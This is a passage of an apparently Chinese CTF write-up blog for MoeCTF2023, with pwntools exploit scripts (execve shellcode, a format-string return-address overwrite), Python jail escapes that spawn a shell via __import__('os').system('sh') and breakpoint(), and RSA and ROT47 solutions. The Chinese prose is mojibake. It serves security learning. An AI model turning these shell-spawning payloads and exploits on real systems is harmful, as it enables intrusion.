<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">54025</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode1 += <span class="string">b&#x27;\x0f\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line"><span class="built_in">print</span>(shellcode1[<span class="number">21</span>])</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov al, 0x05</span></span><br><span class="line"><span class="string">    mov [0x114514020], al</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = shellcode2 + shellcode1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(payload[<span class="built_in">len</span>(payload) - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="format-level2-è¡¥"><a href="#format-level2-è¡¥" class="headerlink" title="format_level2[è¡¥]"></a>format_level2[è¡¥]</h2><p>gotè¡¨ä¸å¯æ”¹ï¼Œæœ‰ä¸€ä¸ªcat flagçš„backdoorå‡½æ•°ï¼Œå…ˆç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ä¸€ä¸ªæ ˆç›¸å…³çš„åœ°å€ï¼Œåˆ©ç”¨åç§»ç®—å‡ºmainçš„è¿”å›åœ°å€ï¼Œç„¶åæŠŠmainçš„è¿”å›åœ°å€çš„ä½ä½ä¿®æ”¹æˆbackdoorçš„ä½ä½ï¼Œè¿™æ ·å°±èƒ½jmpåˆ°backdoorä¸Šäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./format_level2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">51366</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(<span class="string">&quot;%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;You said: \n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(ru(<span class="string">&#x27;But&#x27;</span>)[:-<span class="number">3</span>], <span class="number">16</span>)</span><br><span class="line">ret_addr = leak_addr + <span class="number">64</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 08049317</span></span><br><span class="line">payload = <span class="string">b&quot;%23p%10$hhn&quot;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(ret_addr)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%147p%10$hhn&quot;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(ret_addr + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Crypto-å…¥é—¨æŒ‡åŒ—"><a href="#Crypto-å…¥é—¨æŒ‡åŒ—" class="headerlink" title="Crypto å…¥é—¨æŒ‡åŒ—"></a>Crypto å…¥é—¨æŒ‡åŒ—</h2><p>å»æŸ¥è¯¢äº†ä¸€ä¸‹æŒ‡åŒ—é‡Œé¢çš„ä¿¡æ¯</p>
<p>æ¬§æ‹‰å‡½æ•° çš„å®šä¹‰æ˜¯å°äºç­‰äºnå’Œnäº’è´¨æ•°çš„ä¸ªæ•°ï¼Œnæ˜¯è´¨æ•°çš„æ—¶å€™åˆ™ä¸ºn-1</p>
<p>ç„¶å ax mod b &#x3D; 1çš„æ—¶å€™ï¼Œxåˆ™ç§°ä½œa mod bçš„é€†å…ƒï¼Œæ˜¯açš„å€’æ•°</p>
<p>æ‰€ä»¥d &#x3D; pow(e, -1, phi)è¿™ä¸ªæ˜¯è¿™ä¹ˆæ¥çš„</p>
<p>å¾—åˆ°ç§é’¥åå°±ç›´æ¥è§£å¯†æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># ä¸€ä¸ªéå¸¸å¥½ç”¨çš„cryptoåº“</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7</span></span><br><span class="line">q = <span class="number">0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb</span></span><br><span class="line">c = <span class="number">0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>) <span class="comment"># ä½ çŸ¥é“ä»€ä¹ˆæ˜¯ æ¬§æ‹‰å‡½æ•°å— [1]</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi) <span class="comment"># ä»€ä¹ˆæ˜¯ä¹˜æ³•é€†å…ƒï¼Ÿ [2]</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h2><h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><p>jailæŒºå¥½ç©çš„ï¼Œæ€è·¯å¼€é˜”äº†å¾ˆå¤š</p>
<p>å‚è€ƒçš„è¿™ä¸ªæ–‡ç« å­¦ä¹ çš„<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p>
<h2 id="Jail-lavel-0"><a href="#Jail-lavel-0" class="headerlink" title="Jail lavel 0"></a>Jail lavel 0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç”¨__ import __æ¥å¯¼å…¥osæ¨¡å—ä½¿ç”¨systemæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤,importé­”æœ¯æ–¹æ³•ä½¿ç”¨importå¯¼å…¥æ¨¡å—çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨importé­”æœ¯æ–¹æ³•ã€‚importé­”æœ¯æ–¹æ³•å¯ä»¥ç”¨æ¥åŠ¨è°ƒåŠ è½½æ¨¡å—</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{0dAAkA3NNdFaoIDhHrqY35M60amn3_Cs}</p>
<h2 id="Jail-lavel-1"><a href="#Jail-lavel-1" class="headerlink" title="Jail lavel 1"></a>Jail lavel 1</h2><p>è¿™é‡Œå¤šäº†ä¸ªé•¿åº¦é™åˆ¶ï¼Œlv0çš„payloadç”¨ä¸äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸Šæœåˆ°æœ‰ä¸ªæ€è·¯æ˜¯äºŒæ¬¡ä¼ å‚ï¼Œexec(input())ä½†æ˜¯è¶…äº†ä¸€ä¸ªå­—ç¬¦</p>
<p>æœ‰ä¸ªbreakpoint()å‡½æ•°ï¼Œå¯ä»¥æ‰“å¼€ä¸€ä¸ªå«pdb(python debugger)çš„è°ƒè¯•å™¨ï¼Œè¿™ä¸ªè°ƒè¯•å™¨å¯ä»¥æ‰§è¡Œpythonä»£ç ï¼Œè¿˜æœ‰æ‰“æ–­ç‚¹è°ƒè¯•ä»£ç </p>
<p>è¿›å…¥åç”¨ç¬¬ä¸€é¢˜çš„__ import __ (â€˜osâ€™).system(â€˜shâ€™)å°±èƒ½æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œç„¶å cat flagæ‹¿åˆ°flag</p>
<p>flag{Wk1Sp0Q4gA6at3kySUmJhtdZq_AitxwJ}</p>
<h2 id="Jail-lavel-2"><a href="#Jail-lavel-2" class="headerlink" title="Jail lavel 2"></a>Jail lavel 2</h2><p>è¿™é‡ŒåŠ äº†ä¸ªé•¿åº¦é™åˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨help()å‡½æ•° æŸ¥çœ‹sysæ¨¡å—ï¼Œsysæ¨¡å—ä¸‹æœ‰ä¸ª: å¯ä»¥ä¼ é€’å‚æ•°è¿‡å»å½“shellå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br><span class="line">sys</span><br><span class="line">!</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p>flag{iQR2CFeLlJ8Hi8ydPGs-HVHXSmGiQxwP}</p>
<h2 id="Jail-Level-3-æœªè§£å†³"><a href="#Jail-Level-3-æœªè§£å†³" class="headerlink" title="Jail Level 3 [æœªè§£å†³]"></a>Jail Level 3 [æœªè§£å†³]</h2><p>é•¿åº¦ä¸è¶…è¿‡12 ä¸”ä¸å¯ç”¨breakpoint ,hintä¸­helpè¢«ç¦ç”¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>



<h2 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h2><p>æ˜¯ä¸€ä¸ªä¸æ–­å¾ªç¯ çš„eval(input)ï¼Œpython2.7ç¯å¢ƒçš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flag flag{MvhG6P0cpa4yavJzq6gcJAYgGfNSi5yZ}</p>
<h2 id="Leak-Leval-0"><a href="#Leak-Leval-0" class="headerlink" title="Leak Leval 0"></a>Leak Leval 0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Options: | [V] uln | [B] ackdoor &quot;</span>)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">        not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;vvvveeee&#x27;</span>) <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">        <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>) <span class="keyword">if</span> (<span class="built_in">len</span>(code) &gt; <span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>) <span class="keyword">if</span> func_filter(code):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>) exit(<span class="number">0</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code)) <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>) key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>) <span class="keyword">if</span> (key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>vuln 9çš„é•¿åº¦å¯ä»¥ç”¨globals() å°†çœŸæ­£çš„keyç»™æ‰¾å‡ºæ¥ï¼Œç„¶åç”¨backdooræ‰§è¡Œä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">globals() #æ‰¾åˆ°äº†key &#x27;key_6366a131649a4e9b&#x27;: &#x27;4e86eda06366a131649a4e9be1a9f217&#x27;</span><br><span class="line">4e86eda06366a131649a4e9be1a9f217</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GjyJBWFLfQoLO8qiZpIMjKQEjl-MBKnq&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F&#125;%0N</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢äº†ä¸€ä¸‹rotç¼–ç çš„åŸç†ï¼ŒåŸç†æ˜¯å°†å­—ç¬¦çš„asciiå¾€å‰æ¨</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a> ä½¿ç”¨è¿™é‡Œçš„rot47æ‹¿åˆ°flagï¼Œå°‘äº†ä¸ªméœ€è¦è¡¥å……ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å¯å¯çš„æ–°å›´å¢™"><a href="#å¯å¯çš„æ–°å›´å¢™" class="headerlink" title="å¯å¯çš„æ–°å›´å¢™"></a>å¯å¯çš„æ–°å›´å¢™</h2><p>æœç´¢å›´å¢™è¿™ä¸ªè¯ï¼Œæœåˆ°äº†æ …æ å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp&#125;e&#123;ciri_hT_avn3Fa_j</span><br></pre></td></tr></table></figure>

